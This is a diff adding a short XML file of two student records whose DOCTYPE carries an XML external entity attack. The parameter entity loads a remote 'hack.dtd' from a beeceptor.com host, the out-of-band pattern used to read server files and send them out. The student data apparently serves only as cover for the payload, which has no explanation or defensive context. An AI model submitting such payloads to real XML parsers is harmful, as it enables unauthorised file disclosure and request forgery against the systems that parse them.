@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://hung99.free.beeceptor.com/hack.dtd"> %xxe;]>
+<vcs>
+ <student>
+    <name>Hung</name>
+    <year>1999</year>
+    <school>PTIT</school>
+</student>
+<student>
+    <name>ANH</name>
+    <year>1999</year>
+    <school>PTIT</school>
+</student>   
+</vcs>
